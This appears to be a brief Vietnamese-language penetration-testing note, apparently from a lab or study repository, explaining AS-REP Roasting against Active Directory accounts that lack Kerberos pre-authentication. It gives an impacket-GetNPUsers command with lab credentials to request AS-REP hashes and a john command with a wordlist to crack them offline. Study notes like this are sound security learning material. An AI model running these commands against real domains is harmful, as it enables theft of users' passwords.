### AS-REP Roasting là cuộc tấn công vào các tài khoản Active Directory có cờ DONT_REQ_PREAUTH được đặt, nghĩa là chúng không yêu cầu xác thực trước bằng Kerberos.

### Bất kỳ kẻ tấn công nào có quyền truy cập miền đều có thể yêu cầu phiếu AS-REP (Phản hồi dịch vụ xác thực) cho các tài khoản đó.

### S-REP trả về được mã hóa bằng hàm băm mật khẩu của người dùng (RC4-HMAC) .

### Sau đó, kẻ tấn công có thể thực hiện bẻ khóa mật khẩu ngoại tuyến trên vé đã mã hóa để khôi phục mật khẩu dạng văn bản rõ của người dùng.

```
impacket-GetNPUsers cs.org/kai.bel:password1 -request -dc-ip 192.168.200.129 -request -format john -outputfile outputfile.txt
```

- yêu cầu phiếu AS-REP (Phản hồi dịch vụ xác thực) cho các tài khoản đó:

<img width="1042" height="255" alt="image" src="https://github.com/user-attachments/assets/ea3ed932-06c5-4400-aa9b-77158ae06c63" />

=> ảnh trả về Hàm băm mật khẩu của người dùng (mã hóa bằng RC4)

<img width="599" height="107" alt="image" src="https://github.com/user-attachments/assets/b463d762-ca0e-4e6a-917c-a51f376af1d1" />

```
john --format:krb5asrep outputfile.txt --wordlist=/usr/share/seclists/Passwords/xato-net-10-million-passwords-100000.txt
```

